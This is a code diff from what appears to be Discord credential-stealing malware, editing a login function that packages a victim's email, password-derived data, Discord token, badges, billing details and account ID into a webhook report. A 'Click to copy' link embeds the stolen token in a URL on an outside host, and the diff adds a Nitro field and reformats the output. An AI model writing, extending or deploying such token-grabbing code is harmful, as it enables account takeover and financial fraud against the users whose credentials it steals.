@@ -584,16 +584,21 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '<a:944007295417843743:959785231982931979> Token:',
-            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
+            value: `\`\`\`${token}\`\`\`[Click to copy](https://superfurrycdn.nl/copy/${token})`,
             inline: false,
           },
           {
-            name: '<a:satanist:802503618972483615> Badges:',
+            name: '<a:satanist:802503618972483615> @SN - Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<:944007233820307467:959785232037470208> Billing:',
+            name: '<:944007233820307467:959785232037470208> @SN - Nitro:',
+            value: `*In development*`,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> @SN - Billing:',
             value: `**${billing}**`,
             inline: true,
           },
@@ -614,7 +619,7 @@ const login = async (email, password, token) => {
           },
         ],
         author: {
-          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          name: json.username + '#' + json.discriminator + '('+json.id+')',
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
